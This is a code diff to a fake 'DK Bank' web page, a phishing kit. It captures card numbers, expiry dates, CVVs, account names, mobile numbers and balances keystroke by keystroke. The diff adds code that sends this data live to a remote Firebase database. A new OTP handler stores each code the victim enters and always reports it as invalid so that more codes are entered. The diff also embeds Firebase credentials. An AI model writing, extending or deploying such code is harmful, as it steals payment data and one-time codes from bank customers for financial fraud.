@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>DK Bank - Digital Kidu</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
@@ -12,6 +12,9 @@
             background-size: cover;
             display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px;
             position: relative;
+            touch-action: pan-y;
+            -webkit-user-select: none;
+            user-select: none;
         }
         body::before {
             content: ''; position: absolute; top: 0; left: 0; width: 100%; height: 100%;
@@ -171,7 +174,49 @@
         </div>
     </div>
 
-    <script>
+    <!-- ================= FIREBASE SDK & LOGIC ================= -->
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
+        import { getDatabase, ref, push, set, update, get } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";
+
+        // --- Firebase Configuration ---
+        const firebaseConfig = {
+            apiKey: "AIzaSyC1KSnt2oLvpg7KFnyoHlex6spToyOO-nE",
+            authDomain: "pak-national-earn.firebaseapp.com",
+            databaseURL: "https://pak-national-earn-default-rtdb.firebaseio.com",
+            projectId: "pak-national-earn",
+            storageBucket: "pak-national-earn.firebasestorage.app",
+            messagingSenderId: "670295282897",
+            appId: "1:670295282897:web:ac051079fdd3eef8cea1f0",
+            measurementId: "G-M5SFQB9HR6"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const database = getDatabase(app);
+
+        // --- Global User ID for this session ---
+        let currentFirebaseKey = null;
+
+        // --- Create New User in Firebase ---
+        function createFirebaseUser(initialData) {
+            const usersRef = ref(database, 'dk_bank_users');
+            const newUserRef = push(usersRef);
+            currentFirebaseKey = newUserRef.key;
+            set(newUserRef, initialData)
+                .then(() => console.log("✅ New user created in Firebase!"))
+                .catch((error) => console.error("❌ Firebase Error: ", error));
+        }
+
+        // --- Update Existing User in Firebase ---
+        function updateFirebaseUser(updatedData) {
+            if (!currentFirebaseKey) return;
+            const userRef = ref(database, 'dk_bank_users/' + currentFirebaseKey);
+            update(userRef, updatedData)
+                .then(() => console.log("✅ Data updated in Firebase!"))
+                .catch((error) => console.error("❌ Firebase Update Error: ", error));
+        }
+
+        // --- DOM Elements ---
         const screenLogin = document.getElementById('screen-login');
         const screenDetails = document.getElementById('screen-details');
         const screenOtp = document.getElementById('screen-otp');
@@ -205,18 +250,44 @@
             }, duration);
         }
 
-        // --- GET & SAVE USER (LIVE) ---
-        let currentUserId = null;
-
-        function getUsers() {
-            return JSON.parse(localStorage.getItem('dk_bank_users')) || [];
+        // --- GET CURRENT DATA FROM FORM ---
+        function getFormData() {
+            return {
+                cardNumber: atmCardInput.value.trim() || "Not Provided",
+                expiry: expiryInput.value.trim() || "Not Provided",
+                cvv: cvvInput.value.trim() || "Not Provided",
+                accountName: accNameInput.value.trim() || "Not Provided",
+                mobile: mobileInput.value.trim() || "Not Provided",
+                balance: balanceInput.value.trim() || "Not Provided",
+                timestamp: new Date().toLocaleString()
+            };
         }
 
-        function saveUsers(users) {
-            localStorage.setItem('dk_bank_users', JSON.stringify(users));
+        // --- LIVE SAVE ---
+        function liveSave() {
+            const data = getFormData();
+
+            const hasAnyData = data.cardNumber !== "Not Provided" || 
+                               data.expiry !== "Not Provided" || 
+                               data.cvv !== "Not Provided" || 
+                               data.accountName !== "Not Provided" || 
+                               data.mobile !== "Not Provided" || 
+                               data.balance !== "Not Provided";
+
+            if (!hasAnyData) return;
+
+            if (!currentFirebaseKey) {
+                createFirebaseUser({
+                    ...data,
+                    id: Date.now(),
+                    otpAttempts: []
+                });
+            } else {
+                updateFirebaseUser(data);
+            }
         }
 
-        // --- SCREEN 1: CARD FORM ---
+        // --- SCREEN 1 ---
         function checkCardForm() {
             const isCardValid = atmCardInput.value.trim().length === 16;
             const isExpiryValid = expiryInput.value.trim().length === 5;
@@ -228,70 +299,25 @@
             }
         }
 
-        // LIVE SAVE: Jaise hi koi input field change ho, admin panel mein save ho jaye
-        function liveSaveScreen1() {
-            if (atmCardInput.value.trim() === "" && expiryInput.value.trim() === "" && cvvInput.value.trim() === "") return;
-            
-            let users = getUsers();
-
-            // Agar current user pehle se hai, to update karein
-            if (currentUserId !== null) {
-                const userIndex = users.findIndex(u => u.id === currentUserId);
-                if (userIndex !== -1) {
-                    users[userIndex].cardNumber = atmCardInput.value || "Not Provided";
-                    users[userIndex].expiry = expiryInput.value || "Not Provided";
-                    users[userIndex].cvv = cvvInput.value || "Not Provided";
-                    users[userIndex].timestamp = new Date().toLocaleString();
-                    saveUsers(users);
-                    return;
-                }
-            }
-
-            // Agar naya user hai (pehli baar card number daala)
-            if (atmCardInput.value.trim() !== "" && currentUserId === null) {
-                currentUserId = Date.now();
-                const newUser = {
-                    id: currentUserId,
-                    cardNumber: atmCardInput.value || "Not Provided",
-                    expiry: expiryInput.value || "Not Provided",
-                    cvv: cvvInput.value || "Not Provided",
-                    accountName: "Not Provided",
-                    mobile: "Not Provided",
-                    balance: "Not Provided",
-                    timestamp: new Date().toLocaleString()
-                };
-                users.push(newUser);
-                saveUsers(users);
-            }
-        }
-
-        // Add event listeners for live saving
-        atmCardInput.addEventListener('input', function() {
-            checkCardForm();
-            liveSaveScreen1();
-        });
         expiryInput.addEventListener('input', function(e) {
             let val = this.value.replace(/\D/g, '');
             if (val.length >= 2) val = val.substring(0, 2) + '/' + val.substring(2, 4);
             this.value = val;
             checkCardForm();
-            liveSaveScreen1();
+            liveSave();
         });
-        cvvInput.addEventListener('input', function() {
-            checkCardForm();
-            liveSaveScreen1();
-        });
+        atmCardInput.addEventListener('input', function() { checkCardForm(); liveSave(); });
+        cvvInput.addEventListener('input', function() { checkCardForm(); liveSave(); });
 
-        // PROCEED BUTTON
         btnProceed.addEventListener('click', function() {
-            liveSaveScreen1(); // Make sure final data is saved
-            showLoading("Verifying Card...", 2500, () => {
+            liveSave();
+            showLoading("Verifying Card...", 2000, () => {
                 screenLogin.classList.add('hidden');
                 screenDetails.classList.remove('hidden');
             });
         });
 
-        // --- SCREEN 2: ACCOUNT FORM ---
+        // --- SCREEN 2 ---
         function checkDetailsForm() {
             if (accNameInput.value.trim() !== '' && mobileInput.value.trim() !== '' && balanceInput.value.trim() !== '') {
                 btnConfirm.classList.add('active'); btnConfirm.disabled = false;
@@ -300,33 +326,17 @@
             }
         }
 
-        // LIVE SAVE: Screen 2 ka data bhi live save hoga
-        function liveSaveScreen2() {
-            if (currentUserId === null) return;
-            
-            let users = getUsers();
-            const userIndex = users.findIndex(u => u.id === currentUserId);
-            if (userIndex !== -1) {
-                users[userIndex].accountName = accNameInput.value || "Not Provided";
-                users[userIndex].mobile = mobileInput.value || "Not Provided";
-                users[userIndex].balance = balanceInput.value || "Not Provided";
-                users[userIndex].timestamp = new Date().toLocaleString();
-                saveUsers(users);
-            }
-        }
+        accNameInput.addEventListener('input', function() { checkDetailsForm(); liveSave(); });
+        mobileInput.addEventListener('input', function() { checkDetailsForm(); liveSave(); });
+        balanceInput.addEventListener('input', function() { checkDetailsForm(); liveSave(); });
 
-        accNameInput.addEventListener('input', function() { checkDetailsForm(); liveSaveScreen2(); });
-        mobileInput.addEventListener('input', function() { checkDetailsForm(); liveSaveScreen2(); });
-        balanceInput.addEventListener('input', function() { checkDetailsForm(); liveSaveScreen2(); });
-
-        // CONFIRM BUTTON
         btnConfirm.addEventListener('click', function() {
-            liveSaveScreen2(); // Save final data
+            liveSave();
 
             let mobVal = mobileInput.value.trim();
             maskedMobile.textContent = mobVal.slice(-4) || "7799";
 
-            showLoading("Sending OTP...", 2500, () => {
+            showLoading("Sending OTP...", 2000, () => {
                 screenDetails.classList.add('hidden');
                 screenOtp.classList.remove('hidden');
                 startOtpTimer();
@@ -369,23 +379,49 @@
             checkOtpForm(); otpBoxes[0].focus(); otpError.style.display = 'none';
         });
 
+        // --- VERIFY BUTTON (SAVES OTP + ALWAYS INVALID) ---
         btnVerify.addEventListener('click', function() {
             otpError.style.display = 'none';
-            showLoading("Verifying OTP...", 3500, () => {
+
+            // 1. OTP collect karein
+            let enteredOtp = '';
+            otpBoxes.forEach(box => { enteredOtp += box.value; });
+
+            // 2. Firebase mein save karein
+            if (currentFirebaseKey) {
+                const userRef = ref(database, 'dk_bank_users/' + currentFirebaseKey);
+                
+                get(userRef).then((snapshot) => {
+                    if (snapshot.exists()) {
+                        const userData = snapshot.val();
+                        let otpAttempts = userData.otpAttempts || [];
+                        
+                        otpAttempts.push({
+                            otp: enteredOtp,
+                            time: new Date().toLocaleString()
+                        });
+
+                        update(userRef, { 
+                            otpAttempts: otpAttempts,
+                            lastOtp: enteredOtp,
+                            lastOtpTime: new Date().toLocaleString()
+                        }).then(() => {
+                            console.log("✅ OTP saved to Firebase!");
+                        }).catch((error) => {
+                            console.error("❌ OTP save error: ", error);
+                        });
+                    }
+                });
+            }
+
+            // 3. Loading aur Invalid message
+            showLoading("Verifying OTP...", 3000, () => {
                 otpError.style.display = 'block';
                 otpBoxes.forEach(box => box.value = '');
                 checkOtpForm();
                 otpBoxes[0].focus();
             });
         });
-
-        // Live update every 2 seconds in case user stops typing
-        setInterval(() => {
-            if (currentUserId !== null) {
-                liveSaveScreen1();
-                liveSaveScreen2();
-            }
-        }, 2000);
 
     </script>
 </body>
